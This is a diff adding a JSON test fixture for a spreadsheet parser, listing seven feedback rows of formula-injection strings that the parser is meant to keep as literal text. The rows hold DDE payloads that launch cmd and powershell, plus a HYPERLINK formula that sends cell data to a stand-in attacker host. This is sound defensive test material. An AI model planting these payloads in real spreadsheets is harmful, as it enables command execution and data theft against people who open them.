@@ -1,0 +1,83 @@
+{
+  "fixtureId": "25_hostile_formulas",
+  "fixtureNumber": 25,
+  "filename": "25_hostile_formulas.xlsx",
+  "format": "xlsx",
+  "description": "Adversarial strings containing formula injection prefixes (=, +, -, @, \\t, \\n, |) strictly treated as literal text",
+  "sheets": [
+    {
+      "sheetName": "User_Submissions",
+      "headers": {
+        "detectedRowIndex": 0,
+        "confidence": 1,
+        "originalHeaders": [
+          "Submission ID",
+          "User Handle",
+          "Feedback Text",
+          "Priority Code"
+        ],
+        "sanitizedKeys": [
+          "submission_id",
+          "user_handle",
+          "feedback_text",
+          "priority_code"
+        ]
+      },
+      "inferredTypes": {
+        "submission_id": "id",
+        "user_handle": "text",
+        "feedback_text": "text",
+        "priority_code": "category"
+      },
+      "rowCount": 7,
+      "columnCount": 4,
+      "rows": [
+        {
+          "submission_id": "SUB-001",
+          "user_handle": "security_tester_1",
+          "feedback_text": "=cmd|' /C calc'!A0",
+          "priority_code": "High"
+        },
+        {
+          "submission_id": "SUB-002",
+          "user_handle": "security_tester_2",
+          "feedback_text": "@SUM(1, 999)",
+          "priority_code": "Medium"
+        },
+        {
+          "submission_id": "SUB-003",
+          "user_handle": "security_tester_3",
+          "feedback_text": "+HYPERLINK(\"http://attacker.example/exfil?d=\"&A1, \"Click for bonus\")",
+          "priority_code": "Critical"
+        },
+        {
+          "submission_id": "SUB-004",
+          "user_handle": "security_tester_4",
+          "feedback_text": "-2+5+cmd|' /C powershell -c calc'!A0",
+          "priority_code": "Critical"
+        },
+        {
+          "submission_id": "SUB-005",
+          "user_handle": "security_tester_5",
+          "feedback_text": "\t=1+1",
+          "priority_code": "Low"
+        },
+        {
+          "submission_id": "SUB-006",
+          "user_handle": "security_tester_6",
+          "feedback_text": "\n=calc",
+          "priority_code": "Low"
+        },
+        {
+          "submission_id": "SUB-007",
+          "user_handle": "security_tester_7",
+          "feedback_text": "|dir",
+          "priority_code": "Medium"
+        }
+      ],
+      "metadata": {
+        "primaryKey": "submission_id"
+      }
+    }
+  ]
+}
